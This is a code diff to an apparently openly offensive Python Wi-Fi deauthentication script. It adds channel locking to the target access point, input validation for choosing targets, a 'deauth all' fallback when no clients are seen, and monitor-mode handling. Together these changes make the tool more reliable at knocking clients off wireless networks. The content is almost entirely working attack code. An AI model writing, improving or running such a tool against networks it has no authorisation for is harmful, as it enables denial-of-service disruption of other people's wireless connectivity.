@@ -31,6 +31,40 @@ def get_all_interfaces():
     """Get all network interfaces."""
     return psutil.net_if_addrs()
 
+def set_channel(interface, channel):
+    """Lock the interface to a specific Wi-Fi channel.
+
+    Needed before client discovery / deauth: an unlocked monitor interface
+    (or one still channel-hopping) will transmit on the wrong channel and the
+    target AP/client never sees the frames.
+    """
+    if not channel or channel in ("N/A", None):
+        return False
+    try:
+        subprocess.run(["iwconfig", interface, "channel", str(channel)], check=True)
+        return True
+    except subprocess.CalledProcessError:
+        print(f"{r}Failed to set {y}{interface}{r} to channel {y}{channel}{w}")
+        return False
+
+def _select_index(prompt, size, allow_zero=False):
+    """Prompt for a 1-based selection and validate it.
+
+    Re-asks on non-numeric or out-of-range input instead of crashing with a
+    ValueError/IndexError. Returns the integer entered (0..size).
+    """
+    low = 0 if allow_zero else 1
+    while True:
+        raw = input(prompt).strip()
+        try:
+            value = int(raw)
+        except ValueError:
+            print(f"{r}Enter a number between {low} and {size}.{w}")
+            continue
+        if low <= value <= size:
+            return value
+        print(f"{r}Out of range. Enter a number between {low} and {size}.{w}")
+
 def set_monitor_mode(interface):
     """Set the specified interface to monitor mode."""
     try:
@@ -63,7 +97,7 @@ def packet_handler(packet):
     """Handle packets to detect access points."""
     if packet.haslayer(Dot11Beacon) or packet.haslayer(Dot11ProbeResp):
         bssid = packet[Dot11].addr2
-        ssid = packet[Dot11Elt].info.decode() if packet.haslayer(Dot11Elt) else "<hidden>"
+        ssid = packet[Dot11Elt].info.decode(errors="ignore") if packet.haslayer(Dot11Elt) else "<hidden>"
         dbm_signal = packet.dBm_AntSignal if hasattr(packet, 'dBm_AntSignal') else "N/A"
         stats = packet[Dot11Beacon].network_stats() if packet.haslayer(Dot11Beacon) else {}
         channel = stats.get("channel", "N/A")
@@ -111,8 +145,14 @@ def scan_wifi(interface):
         print(f"{r}No access points detected.")
         return None
 
-    selection = int(input(f"\n{y}Enter the selection{r}{y}: "))
+    selection = _select_index(f"\n{y}Enter the selection{r}{y}: ", len(access_points))
     selected_bssid = list(access_points.keys())[selection - 1]
+
+    # Lock the radio to the target AP's channel so later client scanning and
+    # deauth transmit on the right frequency instead of a hopping channel.
+    channel = access_points[selected_bssid]["channel"]
+    if set_channel(interface, channel):
+        print(f"{g}Locked {r}{interface}{g} to channel {b}{channel}{w}")
     return selected_bssid
 
 def packet_handler1(packet):
@@ -141,8 +181,10 @@ def scan_clients(interface, target_bssid):
     for k, client in enumerate(unique_clients.keys(), start=1):
         print(f"{g}[{r}{k}{g}]{y} Client MAC: {b}{client}{g}, {y}Signal: {b}{unique_clients[client]}")
 
+    if not unique_clients:
+        print(f"{r}No clients detected. Use deauth-all ({g}0{r}).{w}")
     print(f"{g}[{r}0{g}]{r} Deauth all")
-    selection = int(input(f"\n{y}Select the client{r}:{y}"))
+    selection = _select_index(f"\n{y}Select the client{r}:{y}", len(unique_clients), allow_zero=True)
     return "0" if selection == 0 else list(unique_clients.keys())[selection - 1]
 
 def build_deauth_frame(target_mac, gateway_mac, reason=7):
@@ -195,6 +237,18 @@ def auto_interface():
     print(f"{r}No suitable interface found.{w}")
     exit()
 
+def mon_interface(interface):
+    """Set the specified interface to monitor mode."""
+    if interface not in get_all_interfaces().keys():
+        print(f"{r}No interface found with that name{w}")
+        subprocess.run(["systemctl", "start", "NetworkManager"])
+        exit()
+    print(f"Attempting to set {interface} to monitor mode...")
+    if not set_monitor_mode(interface):
+        print(f"{r}Something went wrong with the interface{w}")
+        subprocess.run(["systemctl", "start", "NetworkManager"])
+        exit()
+
 def man_interface(interface):
     """Set the specified interface to managed mode."""
     if interface not in get_all_interfaces().keys():
@@ -218,7 +272,7 @@ def main():
     parser = argparse.ArgumentParser(description="Wi-Fi deauth script")
     parser.add_argument("--man", type=str, help="Set interface to managed mode")
     parser.add_argument("--mon", type=str, help="Set interface to monitor mode")
-    parser.add_argument("--interface", type=str, help="Set interface to use")
+    parser.add_argument("-i", "--interface", type=str, help="Set interface to use")
     parser.add_argument("-l", "--list_interface", action='store_true', help="List interfaces to use")
     parser.add_argument("-t", "--target_mac", type=str, help="Target MAC address")
     parser.add_argument("-g", "--gateway_mac", type=str, help="Gateway MAC address")
@@ -246,7 +300,7 @@ def main():
         set_manage_mode(interface)
         exit()
     elif args.mon:
-        man_interface(args.mon)
+        mon_interface(args.mon)
         return
     elif args.list_interface:
         print("Network interfaces:")
